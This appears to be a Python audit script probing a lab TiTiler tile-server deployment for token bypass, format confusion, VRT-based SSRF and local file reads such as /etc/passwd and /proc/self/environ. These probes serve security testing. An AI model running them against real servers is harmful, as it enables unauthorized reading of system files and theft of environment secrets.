import urllib.request, urllib.parse, urllib.error, json, sys
def get(host, path, **q):
    url=f"http://{host}{path}"+("?"+urllib.parse.urlencode(q) if q else "")
    try:
        r=urllib.request.urlopen(url,timeout=30); body=r.read(); code=r.status
    except urllib.error.HTTPError as e: body=e.read(); code=e.code
    except Exception as e: body=repr(e).encode(); code="ERR"
    try: j=json.loads(body); short=json.dumps(j)[:300]
    except Exception: short=f"<{len(body)} bytes>"
    print(f"{code}\t{path}?{urllib.parse.urlencode(q)[:110]}\t{short}")
    return code, body
F="http://audit-files:8080"
O="audit-titiler-open"; K="audit-titiler-tok"
print("== token instance, no / wrong token, no url param")
get(K,"/cog/info"); get(K,"/cog/info",access_token="wrong"); get(K,"/healthz")
get(K,"/cog/info",url=f"{F}/real.tif")
get(K,"/cog/info",url=f"{F}/real.tif",access_token="labtoken-not-a-real-secret")
print("== open instance (as production would be if the token secret is unset)")
get(O,"/cog/info",url=f"{F}/real.tif")
get(O,"/cog/info",url=f"{F}/notallowed.png")
print("== format confusion: .tif URL, other bytes")
for n in ("nc_classic","nc4"):
    get(O,"/cog/info",url=f"{F}/{n}.tif")
    get(O,"/cog/info",url=f"/vsicurl/{F}/{n}.tif")
print("== VRT served as .tif (GDAL_SKIP not set)")
get(O,"/cog/info",url=f"{F}/vrt_ssrf.tif")
get(O,"/cog/statistics",url=f"{F}/vrt_ssrf.tif")
for n in ("vrt_raw_hostname","vrt_raw_environ"):
    get(O,"/cog/info",url=f"{F}/{n}.tif")
    c,b=get(O,"/cog/statistics",url=f"{F}/{n}.tif")
print("== local paths directly")
get(O,"/cog/info",url="/etc/hostname")
get(O,"/cog/info",url="/proc/self/environ")
get(O,"/cog/info",url="file:///etc/passwd")
print("== mosaic disabled?")
get(O,"/mosaicjson/info",url=f"{F}/x.json")
print("== same format-confusion probes with userfaultfd available (seccomp=unconfined, approximates a Fly microVM where Titiler runs as root)")
U="audit-titiler-ufd"
for n in ("nc_classic","nc4"):
    get(U,"/cog/info",url=f"{F}/{n}.tif")
get(U,"/cog/info",url=f"{F}/vrt_ssrf.tif")
print("== extension filter: VRT nested source with a non-.tif extension")
get(O,"/cog/info",url=f"{F}/vrt_ssrf_noext.tif")
